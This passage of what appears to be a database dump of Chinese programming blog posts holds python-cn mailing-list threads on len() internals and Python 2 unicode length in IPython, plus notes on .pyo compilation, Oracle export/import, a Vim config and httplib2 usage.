Alexander\n日期： 2012年7月20日 上午12:28\n收件人： python-cn@googlegroups.com\n\n\n第一、cache存在雪崩问题，需要预热，还是会有蛋痛的复杂控制并不能降低系统的复杂程度。\n第二、缓存并不能解决动态内容造成的问题，用js去解决是撒旦归撒旦上帝归上帝的方式，隔离度好，而且CMS所管理的静态内容本来就是以静态为主，动态内容相对较少，不然干嘛上CMS？动态的部分要加速自己处理单独的缓存好了\n\n\n----------\n发件人： Shell Xu \n日期： 2012年7月20日 上午9:23\n收件人： python-cn@googlegroups.com\n\n\n对命中率和生成时间不满意的，nginx有未命中时转向功能。\n\n----------\n发件人： duyue \n日期： 2012年7月20日 上午10:44\n收件人： python-cn@googlegroups.com\n\n\ncache不过期, 那和静态文件有区别么\n\n', 1, 19, 6, '2012-07-21 21:31:27', '2012-07-21 21:31:27', 'sublime text 2'),
	('cae5ced9323c42aabaf785ea31191233', '4e84ce1b8a5247bb8a6179959438b55f', '3', NULL, '编译Python－py、pyo', 'python', NULL, '\nPython 其实并非是完全的解释性语言，它是有编译的，在执行 py 文件时，Python 程序会将 py 文件编译成 pyo，然后再交由 Python 的虚拟机执行。\n\n相对于 py 文件来说，编译成 pyo 本质上和 py 没有太大区别，只是对于这个模块的加载速度提高了，而并没有提高代码的执行速度，所以通常情况下不用主动编译 py 文件。\n\n但编译成 pyo 后可以隐藏源代码，就像 C 用 Gcc 编译后生成的文件一样，不过，据说有反编译 Python 的程序，这就不是本文的讨论范围了～\n\n编译单独的 py 文件：\n\n> python -O -m py_compile vzHelloWorld.py\n\n编译某一目录下的 py 文件：\n\n> python -O -m compileall /home/vzomik/Python/\n\n附注：被编译文件必须是 .py 后缀，编译后的 pyo 文件没有可执行权限，需用 chmod +x 赋予可执行权限。', 1, 23, 6, '2012-07-12 00:40:29', '2012-07-12 00:40:29', 'sublime text 2'),
	('cccf52dfceea476eac940bd101295818', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'python中len()是如何实现的？', 'CPyUG,python', NULL, '\n\n[CPyUG] python中len()是如何实现的？\n\n发件人： gauss \n日期： 2012年6月30日 下午9:34\n收件人： python-cn@googlegroups.com\n\n\nHi 各位大牛, \n       请len()这个函数是如何实现的，不知道效率高不高？\n       或者说，   怎么查看python中类似len()这种函数的源码？\n\n发件人： Xunzhen Quan \n日期： 2012年6月30日 下午9:51\n收件人： python-cn@googlegroups.com\n\n\nlen() 是调用对象的 .__len__() 方法得到的，具体效率与不同对象的实现有关\n\n----------\n发件人： Leo Jay\n日期： 2012年7月1日 上午12:29\n收件人： python-cn@googlegroups.com\n\n\n2012/6/30 gauss \n>\n> Hi 各位大牛,\n>        请len()这个函数是如何实现的，不知道效率高不高？\n>        或者说，   怎么查看python中类似len()这种函数的源码？\n\nlen是用对象的__len__方法来取长度的。所以你不能很笼统的说len的效率高不高。这得看具体对象的__len__是怎么实现的。\n你当然也可以为自己的类实现一个__len__方法，然后速度巨慢。比方说下面的例子：\n\n    import timeit\n    import time\n\n    class A(object):\n            def __len__(self):\n                    time.sleep(1)\n                    return 0\n\nprint timeit.timeit(lambda : len(A()), number=5)\n\n不过，如果具体说到某个类，我们还是可以去分析的。\n\n比方说，我们想知道list的len方法，效率高不高。\n\n从黑盒的方式，我们可以生成一个有很多元素的list，然后看看len要多长时间：\n\n    import timeit\n    import time\n\n    print timeit.timeit(\'len(a)\', \'a = range(10000000)\', number=1000000)\n\n在我电脑上的结果是0.0686秒。\n对1000万元素的list，取len做100万遍，只要0.0686秒。那这个len无疑是个常数时间的操作。\n\n从白盒的方式，我们就要去看源代码了。我以2.7.2版本的代码为例。\n既然len是builtin函数，那我们显然应该在 Python/bltinmodule.c 文件里去找。\n\n在 builtin_methods 的定义里，你可以看到：\n\n    {"len",             builtin_len,        METH_O, len_doc},\n\n说明len的实现是用一个叫builtin_len的函数：\n\n    static PyObject *\n    builtin_len(PyObject *self, PyObject *v)\n    {\n        Py_ssize_t res;\n\n        res = PyObject_Size(v);\n        if (res < 0 && PyErr_Occurred())\n            return NULL;\n        return PyInt_FromSsize_t(res);\n    }\n\n这里可以看出，结果在PyObject_Size里。在 Objects/abstract.c 里：\n\n    Py_ssize_t\n    PyObject_Size(PyObject *o)\n    {\n        PySequenceMethods *m;\n\n        if (o == NULL) {\n            null_error();\n            return -1;\n        }\n\n        m = o->ob_type->tp_as_sequence;\n        if (m && m->sq_length)\n            return m->sq_length(o);\n\n        return PyMapping_Size(o);\n    }\n\n这里可以发现，在对象类型的tp_as_sequence下面的sq_length里。\n那我们去Objects/listobject.c里找到list的类型定义，在这里可以看到，\n\n    sq_length由一个叫list_length的方法实现：\n    static Py_ssize_t\n    list_length(PyListObject *a)\n    {\n        return Py_SIZE(a);\n    }\n\n在Include/object.h里找到Py_SIZE的定义：\n\n    #define Py_SIZE(ob)             (((PyVarObject*)(ob))->ob_size)\n\n总结下来一句话，size是放在list对象的一个叫ob_size的成员里，list的len操作，\n就是直接读这个数值而已。这是一个常数时间操作。\n\n----------\n发件人： lee Alexander \n日期： 2012年7月1日 上午12:30\n收件人： python-cn@googlegroups.com\n\npython是开源的\n\n----------\n发件人： free.wang \n日期： 2012年7月1日 上午12:43\n收件人： python-cn@googlegroups.com\n\n赞！　群里的质量越来越高了。　\n\n----------\n发件人： fengjian/风间星魂 \n日期： 2012年7月1日 上午11:07\n收件人： python-cn@googlegroups.com\n\n\n非常赞，说的很清楚。\n\n\n\nfengjian/风间星魂\nblog: fengjian.sinaapp.com\n\n求武汉地区任意unix方向工作。\n2年iOS经验 objc/c/c++/python/lua\n\n----------\n发件人： Zoom.Quiet \n日期： 2012年7月1日 上午11:47\n收件人： python-cn@googlegroups.com\n\n\n是也乎,看过 Robert Chen 的Python 源代码解析一书的,应该都知道怎么回事儿了,,\n\n在 2012年7月1日 上午12:29，Leo Jay  写道：\n--\n人生苦短, Pythonic! 冗余不做,日子甭过!备份不做,十恶不赦!\n俺: http://about.me/zoom.quiet\n文字协议: http://creativecommons.org/licenses/by-sa/2.5/cn/\n\n----------\n发件人： gauss \n日期： 2012年7月2日 上午12:56\n收件人： python-cn@googlegroups.com\n\n', 1, 44, 6, '2012-07-13 00:23:51', '2012-07-13 17:46:36', 'sublime text 2'),
	('d161fb3287404ae5bb004ec8e0724acc', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'oracle数据导入导出', 'oracle', NULL, '\n\nexp userid=system/system@ORCL_192.168.8.7 owner=user1 file=20090313.dmp\n\nimp userid=system/system fromuser=user1 touser=user1 ignore=y  file=20090313.dmp', 1, 22, 7, '2012-07-13 23:45:17', '2012-07-13 23:45:17', 'sublime text 2'),
	('d2d05abdf46d47528f4994a3b1a57d1d', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'Vim配置文件一枚', 'vim', NULL, '\n\nset nocompatible   \nset backspace=2   \nsource $VIMRUNTIME/vimrc_example.vim   \nif has(\'win32\')   \nsource $VIMRUNTIME/mswin.vim   \nbehave mswin   \nendif   \nset encoding=utf-8   \nset fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,euc-jp,euc-kr,latin1  \nset fileencoding=utf-8 " 新建文件使用的编码   \n" set makeprg=python -u %   \n" 解决菜单乱码   \nset langmenu=zh_CN   \nlet $LANG = \'zh_CN.UTF-8\'   \nsource $VIMRUNTIME/delmenu.vim   \nsource $VIMRUNTIME/menu.vim   \n \n" 自动补全命令时候使用菜单式匹配列表   \nset wildmenu   \n" 允许退格键删除   \nset backspace=2    \n" 启用鼠标   \nset mouse=a   \n" 文件类型   \nfiletype on   \nfiletype plugin on   \nfiletype indent on   \nset ai "自动对齐   \nset sw=4 "设置Tab宽度   \nset sm "sm会在你敲},]或)显示出对应匹配的{,[或(来   \nset nobackup "不备份   \nset tabstop=4 "tab->空格   \nset expandtab   \nset linespace=2   \nset ve=all   \n"set tw=140   \nset autochdir   \nset ignorecase smartcase   \nset number   \nset cindent   \nset smartindent   \ncolo koehler   \nlet g:winManagerWindowLayout = "FileExplorer"   \nlet Tlist_Use_Right_Window=1   \nlet g:pydiction_location = \'vimfiles/ftplugin/complete-dict\'   \nlet g:pydiction_menu_height = 20   \nlet g:miniBufExplMapWindowNavVim = 1   \nlet g:miniBufExplMapWindowNavArrows = 1   \nlet g:miniBufExplMapCTabSwitchBufs = 1   \nlet g:miniBufExplModSelTarget = 1   \n\n"python配置   \nautocmd BufRead *.py set makeprg=python\\ -c\\ \\"import\\ py_compile,sys;\\ sys.stderr=sys.stdout;\\ py_compile.compile(r\'%\')\\"   \nautocmd BufRead *.py set efm=%C\\ %.%#,%A\\ \\ File\\ \\"%f\\"\\\\,\\ line\\ %l%.%#,%Z%[%^\\ ]%\\\\@=%m   \nautocmd BufRead *.py nmap <F9> :!python %<CR>   \nautocmd BufRead *.py nmap <F6> :make<CR>   \n"autocmd BufRead *.py copen "如果是py文件，则同时打开编译信息窗口   \n"map <F2> <Esc>:BufExplorer<cr>   \nmap <F3> :browse confirm e<CR>   \nmap <F4> <Esc>:tabnew<cr>   \nmap <F5> <Esc>:tabclose<cr>   \nmap <F6> :call RunScala()<CR>   \n"浏览标签   \nnnoremap <silent> <F7> :Tlist<CR>   \n"浏览文件   \nnnoremap <silent> <F8> :WMToggle<CR>   \n"map <F9> :call CompileRunJava()<CR>    \nmap <C-lt> : bn<CR>   \nmap <C-gt> : bp<CR>   \nmap <F12> :!ctags -R --c++-kinds=+p --fields=+iaS --extra=+q * <CR>   \n \n" File Explorer   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    \nlet g:explVertical=1 " should I split verticially   \nlet g:explWinSize=20 " width of 35 pixels   \n \n" Win Manager   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    \nlet g:winManagerWidth=20 " How wide should it be( pixels)   \n"let g:winManagerWindowLayout = \'FileExplorer,TagsExplorer|BufExplorer\' " What windows should it   \n" CTags   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""     \nlet Tlist_Ctags_Cmd = \'ctags\' " Location of ctags   \nlet Tlist_Sort_Type = "name" " order by    \nlet Tlist_Use_Right_Window = 1 " split to the right side of the screen   \nlet Tlist_Compart_Format = 1 " show small meny   \nlet Tlist_Exist_OnlyWindow = 1 " if you are the last, kill yourself   \nlet Tlist_File_Fold_Auto_Close = 0 " Do not close tags for other files   \nlet Tlist_Enable_Fold_Column = 0 " Do not show folding tree    \nlet g:ctags_path=\'ctags\'    \nlet g:ctags_statusline=1    \n" Minibuf   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    \nlet g:miniBufExplTabWrap = 1 " make tabs show complete (no broken on two lines)   \nlet g:miniBufExplModSelTarget = 1   \n  \n\nfunc! CompileRunGcc()   \nexec "w"   \nexec "!gcc % -o %<"   \nexec "! ./%<"    \nendfunc   \n \nfunc! CompileRunJava()   \nexec "w"   \nexec "!javac % "   \nexec "!java %<"   \nendfunc   \nfunc! RunScala()  \nexec "w"   \nexec "!scala % "   \nendfunc   \nset diffexpr=MyDiff()   \nfunction MyDiff()   \nlet opt = \'-a --binary \'   \nif &diffopt =~ \'icase\' | let opt = opt . \'-i \' | endif   \nif &diffopt =~ \'iwhite\' | let opt = opt . \'-b \' | endif   \nlet arg1 = v:fname_in    \nif arg1 =~ \' \' | let arg1 = \'"\' . arg1 . \'"\' | endif   \nlet arg2 = v:fname_new   \nif arg2 =~ \' \' | let arg2 = \'"\' . arg2 . \'"\' | endif   \nlet arg3 = v:fname_out    \nif arg3 =~ \' \' | let arg3 = \'"\' . arg3 . \'"\' | endif   \nlet eq = \'\'   \nif $VIMRUNTIME =~ \' \'   \nif &sh =~ \'\\<cmd\'\nlet cmd = \'""\' . $VIMRUNTIME . \'\\diff"\'   \nlet eq = \'"\'   \nelse    \nlet cmd = substitute($VIMRUNTIME, \' \', \'" \', \'\') . \'\\diff"\'    \nendif   \nelse   \nlet cmd = $VIMRUNTIME . \'\\diff\'    \nendif  \nendfunction   \n', 1, 25, 7, '2012-07-14 00:33:18', '2012-07-14 00:33:18', 'sublime text 2'),
	('d8c8d646d4b64b9497c49f9d54053735', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'httplib2,一个功能全面的python http客户端库', 'httplib2', NULL, '\n\n#### 一般用法\n\n    import httplib2\n    h = httplib2.Http(".cache")\n    resp, content = h.request("http://example.org/", "GET")\n\n> content就是请求获取的内容，已经进行了解压处理，resp对象包含了所有的header信息\n\n####  SSL and Basic authentication:\n\n    import httplib2\n    h = httplib2.Http(".cache")\n    h.add_credentials(\'name\', \'password\')\n    resp, content = h.request("https://example.org/chap/2", \n        "PUT", body="This is text", \n        headers={\'content-type\':\'text/plain\'} )\n\n####  缓存控制\n\n    import httplib2\n    h = httplib2.Http(".cache")\n    resp, content = h.request("http://bitworking.org/")\n     ...\n    resp, content = h.request("http://bitworking.org/", \n        headers={\'cache-control\':\'no-cache\'})\n\n> 第一个请求将被缓存\n\n#### 提交表单数据\n\n    >>> from httplib2 import Http\n    >>> from urllib import urlencode\n    >>> h = Http()\n    >>> data = dict(name="Joe", comment="A test comment")\n    >>> resp, content = h.request("http://bitworking.org/news/223/Meet-Ares", "POST", urlencode(data))\n    >>> resp\n    {\'status\': \'200\', \'transfer-encoding\': \'chunked\', \'vary\': \'Accept-Encoding,User-Agent\',\n     \'server\': \'Apache\', \'connection\': \'close\', \'date\': \'Tue, 31 Jul 2007 15:29:52 GMT\', \n     \'content-type\': \'text/html\'}\n\n#### Cookie处理\n\n    #!/usr/bin/env python\n    import urllib\n    import httplib2\n\n    http = httplib2.Http()\n\n    url = \'http://www.example.com/login\'   \n    body = {\'USERNAME\': \'foo\', \'PASSWORD\': \'bar\'}\n    headers = {\'Content-type\': \'application/x-www-form-urlencoded\'}\n    response, content = http.request(url, \'POST\', headers=headers, body=urllib.urlencode(body))\n\n    headers = {\'Cookie\': response[\'set-cookie\']}\n\n    url = \'http://www.example.com/home\'   \n    response, content = http.request(url, \'GET\', headers=headers)     \n\n\n#### 代理设置\n\n    import httplib2\n    import socks\n\n    httplib2.debuglevel=4\n    h = httplib2.Http(proxy_info = httplib2.ProxyInfo(socks.PROXY_TYPE_HTTP, \'localhost\', 8000))\n    r,c = h.request("http://bitworking.org/news/") ', 1, 43, 6, '2012-07-14 12:38:47', '2012-07-14 12:38:47', 'sublime text 2'),
	('e256520823124b8d8108df5095d19f0e', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'python中文编码长度', 'CPyUG', NULL, '\n\n------------------------\n发件人： squall \n日期： 2012年7月17日 下午9:10\n收件人： python-cn@googlegroups.com\n\n\n在使用unicode编码时\na=u\'中国\' \nlen(a)\n显示a的长度为4，但实际上只有两个字，有没有哪种编码是直接可以将a的长度表示为2的呢？\n\n----------\n发件人： windwiny \n日期： 2012年7月17日 下午9:17\n收件人： python-cn@googlegroups.com\n\n\n怎么会有4的结果？ 我在win7,py2.7下测试是2\n\n----------\n发件人： RTNelo \n日期： 2012年7月17日 下午9:38\n收件人： python-cn@googlegroups.com\n\n\npython 2.7.2\ninput : print len(u"中国")\noutput: 4\n\n----------\n发件人： 姜晟 \n日期： 2012年7月17日 下午9:42\n收件人： python-cn@googlegroups.com\n\n\nipython下是不正常的\n\n\n----------\n发件人： squall \n日期： 2012年7月17日 下午10:14\n收件人： python-cn@googlegroups.com\n\n\n就是，ipython下面为什么是4\n而直接用python的话就是2了\n\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 上午7:22\n收件人： python-cn@googlegroups.com\n\n跟ipython没有关系！\n你直接这样写: u\'中国\'，实际上这个字符串不是中国的Unicode字符串，而是以Unicode保存的GBK字节串，也就是类似于这样的:\nu\'\\ab\\cd\\ef\\gh\'。你是在Windows下的吧！如果在Ubuntu的UTF-8环境里，会发现是6。原因就是py是只认编码不认文字的！你写明文的中文，也会被py先转成对应编码的字节串，再给你转到Unicode。所以你要先decode一下再试试就是2了。\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 上午7:52\n收件人： python-cn@googlegroups.com\n\n\n再深入理解一下:\n当写u\'中文\'时，也就是用u前缀修饰一个字符串时，只表示一个声明，不代表那个字符串内部真的就是Unicode。这个过程就好像，你对py说，我希望那货是一个Unicode字符串！py过去一看，我勒个去根本不是，算了随便搞搞吧！于是就简单的把\\xNN转成\\uNNNN，不够双字节补0\n。所以明文的声明Unicode字符串只有写成u\'\\uNNNN\\uNNNN\'才是真正的，否则只是某某编码的字节串逐个双字对齐。所以正确处理中文应该是拿到中文后立刻对其进行decode。\n\n----------\n发件人： pyLemon \n日期： 2012年7月18日 上午9:30\n收件人： python-cn@googlegroups.com\n抄送： CHUN ZHANG <mail@zhang-chun.org>\n\n一直没太搞懂unicode的问题。受益匪浅。。。。感谢！\n\n----------\n发件人： Zephyr \n日期： 2012年7月18日 上午9:35\n收件人： python-cn@googlegroups.com\n\n\n能用代码解释一下您说的这些吗？\n\n如果你说的这些是对的，那我之前对python2中字符串编码的认识就全是错的啦。\n\n显然，对于 (u\'中国\').decode(\'xx\') 是会报错的。\n\n----------\n发件人： panfei \n日期： 2012年7月18日 上午9:56\n收件人： python-cn@googlegroups.com\n\n    >>> a = \'中国\'\n    >>> a.decode(\'gbk\')\n    u\'\\u4e2d\\u56fd\'\n    >>> a.decode(\'gbk\').encode(\'utf8\')\n    \'\\xe4\\xb8\\xad\\xe5\\x9b\\xbd\'\n    >>> len(a.decode(\'gbk\'))\n    2\n    >>> len(a.decode(\'gbk\').encode(\'utf8\'))\n    6\n    >>> \n\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 上午10:04\n收件人： python-cn@googlegroups.com\n\n\n环境：ubuntu + ipython\n>> s = \'中文\'\n\n>> s\n>> \'\\xe4\\xb8\\xad\\xe6\\x96\\x87\'\n\n>> fake_us = u\'中文\'\n\n>> fake_us\n>> u\'\\xe4\\xb8\\xad\\xe6\\x96\\x87\'\n\n>> print s\n中文\n\n>> print fake_us\nä¸­æ–‡\n\n>> real_us = \'中文\'.decode(\'UTF-8\')\n\n>> real_us\n>> u\'\\u4e2d\\u6587\'\n\n>> print real_us\n中文\n\n>> len(s)\n>> 6\n\n>> len(fake_us)\n>> 6\n\n>> len(real_us)\n>> 2\n\n环境：ubuntu + python shell\n>>> s = \'中文\'\n>>> s\n\'\\xe4\\xb8\\xad\\xe6\\x96\\x87\'\n>>> fake_us = u\'中文\'\n>>> fake_us\nu\'\\u4e2d\\u6587\'\n>>> len(s)\n6\n>>> len(fake_us)\n2\n>>> # so fake is real!\n\n可见：\npython内置shell会有一个隐含的decode过程，当它发现用输入到shell中的非ASCII字符构建unicode字符串时，会尝试用当前环境编码将其decode为unicode。而ipython不会。究竟哪个好，众说纷纭。但我个人感觉ipython更好，因为它符合真实世界的情况。对于shell来说，它所看到的就是一堆字节，它不应该知道输入的是什么国家的文字。你想要unicode，ok，你得自己按照你文字的编码decode一下。别指望我给你隐含的做这个事情。\n\n至于(u\'中国\').decode(\'xx\') 是会报错，是肯定的。u\'xxx\'出来的东西就是个unicode字符串了，别管先前内部的是什么字节，现在统统变成unicode下的双字节了（即，原来是\\x1E的现在就是\\u001E）。unicode当然没有decode啦。\n\n\n----------\n发件人： 姜晟 \n日期： 2012年7月18日 上午10:08\n收件人： python-cn@googlegroups.com\n\n是ipython的问题\n\n无论是python命令行还是程序, u\'一‘都应该被识别成u\'\\u4e00\'\n\n但是在ipython(貌似0.12开始已经修正了)下会被识别成u\'\\xe6\\x88\\x91\' (utf8)  /  u\'\\xd2\\xbb\' (gbk)\n\n\n----------\n发件人： Zephyr \n日期： 2012年7月18日 上午10:35\n收件人： python-cn@googlegroups.com\n\n那看来我一直的理解没有问题啦。\n\n我们不说 shell 怎么处理，只看 python 这个语法应该怎么处理。\n\ns = u\'中国\'\n\ns就是一个unicode object，而且这个 unicode 就是表示的"中国"这两个字符(ipython中不是的话我觉得应该是处理错误)。len(s)就是应该为2。我觉得这应该是没有问题的。\n\n当然，这中间有一个隐含的解码过程，并且 python 它根据一些上下文信息可以正确解码：\n\n* win的python shell中，它知道(或者它猜的)你的“源文件”是gb18030.\n* ubuntu的pyhton shell，它知道你的“源文件”是utf8.\n* 而如果不用python shell，写 pyhton 的 .py 源文件，我们通常也使用 # -*- coding: utf-8 -*- 来指定了源文件的编码。\n\n这就是 ipython 的一个 bug :\n\nhttps://bugs.launchpad.net/ipython/+bug/339642\n\n> 究竟哪个好，众说纷纭。但我个人感觉ipython更好，因为它符合真实世界的情况。\n\n这不是“众说纷坛”的问题，这是bug。或者，还有其它的 python 工具，得到的 len(u\'中国\') 不是 2？\n\n----------\n发件人： CHUN ZHANG\n日期： 2012年7月18日 上午11:01\n收件人： python-cn@googlegroups.com\n\n\n我觉得这不能算是bug。应该属于一种设计上不能调众口的问题。\nu\'中文\'如果隐含转换，会养成不良的编码习惯。因为你没有明确表明这个文字是什么编码的，你只是依赖于解释器会给你自动转换。这当然会带来问题。举个例子，你把代码发给一位在日本工作的朋友，他的电脑用的是jp的编码环境，跑你的代码就会出错。所以我个人强烈的建议，所有需要硬编码非ASCII字符串的地方，都应明确写出decode(\'xxx\')的样式。\n\n----------\n发件人： MuSheng Chen \n日期： 2012年7月18日 上午11:23\n收件人： python-cn@googlegroups.com\n\n\nu\'中文\'本來就是用來代替\'中文\'.decode的,在py3下連decode都不用了.\'中文\'.decode才是壞習慣.當你的文件保存的編碼與你decode的編碼不一樣時那就難看了.\n要是用u\'中文\'都算是不良習慣的話,那在py3下不用decode不知道算什麼了.\n\n寫的程序要在gbk,big5,utf8又要用簡繁寫的代碼的人吐槽路過.\n\n----------\n发件人： Zephyr \n日期： 2012年7月18日 上午11:25\n收件人： python-cn@googlegroups.com\n\n在 2012年7月18日 上午11:01，CHUN ZHANG <mail@zhang-chun.org>写道：\n举个例子，你把代码发给一位在日本工作的朋友，他的电脑用的是jp的编码环境，跑你的代码就会出错。\n\n为什么会出错呢？\n\n我的一个 demo.py 这样写：\n\n    # -*- coding: utf-8 -*-\n\n    assert len(u\'中国\') == 2\n\n我把 demo.py 这个源文件发给任何人执行都不会出错吧，当然，除了 bug。\n\n\n> 所以我个人强烈的建议，所有需要硬编码非ASCII字符串的地方，都应明确写出decode(\'xxx\')的样式。\n\n你手写 \'正正正\'.decode(\'xxx\') 和写 u\'正正正\' 在结果上没区别。反倒是前者在某些情况下不能应对变化：\n\n比如原来的源文件是 utf8 编码，那你需要写 \'正正正\'.decode(\'utf8\')。\n\n如果把源文件改成 gb18030 编码，那你建议的方式，必须全部改成 \'正正正\'.decode(\'gb18030\')。\n\n如果直接写 u\'正正正\' 则没有任何问题，任何情况下。\n\nu\'xxx\' 本来就是个 python2 中使用 unicode 的方便方式，何苦还要自己去先定义 str 再 decode 嘛。\n\n\n----------\n发件人： 姜晟 \n日期： 2012年7月18日 上午11:26\n收件人： python-cn@googlegroups.com\n\n我觉得你考虑多了, 无论是u\'xxx\'还是\'xxxx\'.decode(encoding)都一样， 如果是非纯英文，肯定是需要在shebang头注明编码的, 不然运行python脚本会报SyntaxError: Non-ASCII character。  但是shebang头里注明编码， 就算你是gbk写的， 拿到Shift_JIS下一样不会出错的\n\n事实上楼主出这个问题， 除了在ipython下，其他场景下是完全不可能复现的\n\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 上午11:44\n收件人： python-cn@googlegroups.com\n\n现在讲的是py2的环境，如果你非要说py3，那么py3下其实楼主的问题根本就不复存在了。\n因为在py2下编码是个琐碎的问题，我说的decode(\'xxx\')仅针对py2下的习惯。并且，具体怎么写看你的设计能力，不是非得到处写decode。\n\n你完全可以在某个通用模块里写一个\nDEFAULT_CHARSET = \'UTF-8\'\ndef to_unicode(byteSequence, default=DEFAULT_CHARSET):\n.............\n\n对所有中文都调用一下，这样就把编码的处理全部集中到一起，并输出统一为unicode。\n不想“麻烦”的，想把精力放在处理各种编码错误的，我也没办法。\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 上午11:50\n收件人： python-cn@googlegroups.com\n\n楼主讲的就是在shell里，so讨论是在shell里的。你存成文件，文件本身带编码，自然属于另外一个范畴了。\n\n----------\n发件人： CHUN ZHANG\n日期： 2012年7月18日 上午11:58\n收件人： python-cn@googlegroups.com\n\n\n这么说吧，在py2里，我觉得只要出现中文的地方，都要从一个强制的、明确编码的函数里过一下，出来unicode。才能根本的避免千奇百怪的编码错误。每个人习惯不同，所以究竟怎么写，看自己的兴趣了。\n\n----------\n发件人： Leo Jay \n日期： 2012年7月18日 下午12:25\n收件人： python-cn@googlegroups.com\n\n\n2012/7/18 CHUN ZHANG\n> 这么说吧，在py2里，我觉得只要出现中文的地方，都要从一个强制的、明确编码的函数里过一下，出来unicode。才能根本的避免千奇百怪的编码错误。每个人习惯不同，所以究竟怎么写，看自己的兴趣了。\n\n我认为你说的不对。\npython文件头\n #coding:xxx\n就是用来指定文件编码的。而u\'xxx\'里的字符串，当然用的是同样的编码。\n比方说，如果你在文件头里写了\n #coding:utf8\n然后你文件的确是utf8编码的，并且你的代码里字符串都是u\'xxx\'的形式，\n那无论你的文件发给日本的朋友，还是非洲的朋友，只要他的环境支持utf8，就不会出错。\n\n\n----------\n发件人： pansz \n日期： 2012年7月18日 下午2:01\n收件人： python-cn@googlegroups.com\n\n2012/7/18 CHUN ZHANG \n>你直接这样写: u\'中国\'，实际上这个字符串不是中国的Unicode字符串，而是以Unicode保存的GBK字节串，也就是类似于这样的:\nu\'\\ab\\cd\\ef\\gh\'。你是在Windows下的吧！如果在Ubuntu的UTF-8环境里，会发现是6。原因就是py是只认编码不认文字的！你写明文的中文，也会被py先转成对应编码的字节串，再给你转到Unicode。所以你要先decode一下再试试就是2了。\n\n并非如此！缺省的编码也有编码，这个编码应当是你在 python 文件头部声明的编码。\n\n对于命令行而言，这个缺省编码应当是属于终端 tty 的缺省编码。在 Linux 下通常缺省编码是 utf-8，中文 Windows 下这个编码是 GBK。但是，无论这是什么编码，基于终端的应用程序都可以明确的知道终端当时所使用的编码，因而应当针对该编码进行转换。ipython 如果不识别终端当前编码集，那就是它这个程序的问题，没有借口。\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 下午3:16\n收件人： python-cn@googlegroups.com\n\n那你继续在代码里写u\'中文\'好了，反正看上去是没错\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 下午3:21\n收件人： python-cn@googlegroups.com\n\n\n没有人讲终端没有编码。\n你希望shell给你整的好好的，我觉得没必要。我在utf-8的shell里输入中文，我就是希望得到中文的utf-8字节串。\npy2的unicode写法也不是提倡你用u\'中文\'这种形式的！\n因为从规范上讲，你的u\'xxx\'里面的xxx应该是unicode码，你应该写u\'\\uXXXX\\uXXXX\'，你写个中文谁知道是不是unicode，为什么要给你转换好？\n\n\n----------\n发件人： CHUN ZHANG \n日期： 2012年7月18日 下午3:24\n收件人： python-cn@googlegroups.com\n\nso不应该怪ipython\n当你在shell里输入某文字时，出来的就是tty编码下文字的字节串，这没有任何问题\n\n----------\n发件人： Leo Jay\n日期： 2012年7月18日 下午3:41\n收件人： python-cn@googlegroups.com\n\n2012/7/18 CHUN ZHANG\n>\n> 没有人讲终端没有编码。\n> 你希望shell给你整的好好的，我觉得没必要。我在utf-8的shell里输入中文，我就是希望得到中文的utf-8字节串。\n> py2的unicode写法也不是提倡你用u\'中文\'这种形式的！\n\n这句话出处是哪里？\n\n我看到的是，它说，理想中，你会想用自己语言的编码来写字符串，然后举的例子也是u\'xxx\'形式的。当然，前提是你在文件头声明了编码。\nhttp://docs.python.org/howto/unicode.html#unicode-literals-in-python-source-code\n\nIdeally, you’d want to be able to write literals in your language’s\nnatural encoding. You could then edit Python source code with your\nfavorite editor which would display the accented characters naturally,\nand have the right characters used at runtime.\n\nPython supports writing Unicode literals in any encoding, but you have\nto declare the encoding being used. This is done by including a\nspecial comment as either the first or second line of the source file:\n\n> 因为从规范上讲，你的u\'xxx\'里面的xxx应该是unicode码，你应该写u\'\\uXXXX\\uXXXX\'，你写个中文谁知道是不是unicode，为什么要给你转换好？\n\n\n\n----------\n发件人： Leo Jay\n日期： 2012年7月18日 下午3:48\n收件人： python-cn@googlegroups.com\n\n2012/7/18 CHUN ZHANG \n> so不应该怪ipython\n> 当你在shell里输入某文字时，出来的就是tty编码下文字的字节串，这没有任何问题\n\nCPython里运行的结果是2，IPython的运行结果是4，你说IPython没有任何问题？\n那是CPython算错了么？还是2和4都算对？\n\n\n----------\n发件人： CHUN ZHANG\n日期： 2012年7月18日 下午3:57\n收件人： python-cn@googlegroups.com\n\n我一直讲的都是shell里。此帖讲的也是shell里的问题。文件里的代码跟shell里的是两码事。你看清楚\n\n----------\n发件人： CHUN ZHANG\n日期： 2012年7月18日 下午3:59\n收件人： python-cn@googlegroups.com\n\n有没有问题，不是看结果的，是看它依据的原理是什么。\n\n----------\n发件人： Leo Jay\n日期： 2012年7月18日 下午3:59\n收件人： python-cn@googlegroups.com\n\n2012/7/18 CHUN ZHANG\n> 我一直讲的都是shell里。此帖讲的也是shell里的问题。文件里的代码跟shell里的是两码事。你看清楚\n\n所以你认为在文件里和在shell里同一个unicode字符串u\'...\'，它们的长度可以是不一样的？\n\n----------\n发件人： free.wang \n日期： 2012年7月18日 下午4:13\n收件人： python-cn@googlegroups.com\n\nencode utf8 本来就是  一个汉字3\n\nunicode  一个汉字 2\n\n扯shell ipy干啥呢。\n\n----------\n发件人： 依云 \n日期： 2012年7月18日 下午4:37\n收件人： python-cn@googlegroups.com\n\nshell 里是有默认编码的，类Unix使用LANG和 LC_* 环境变量，Windows 控制台也\n有自己的代码页（简体中文默认 cp936）。\n\n我觉得那个就是 ipython 实现上的问题，没考虑到多字节编码。\n\n\n----------\n发件人： 依云 \n日期： 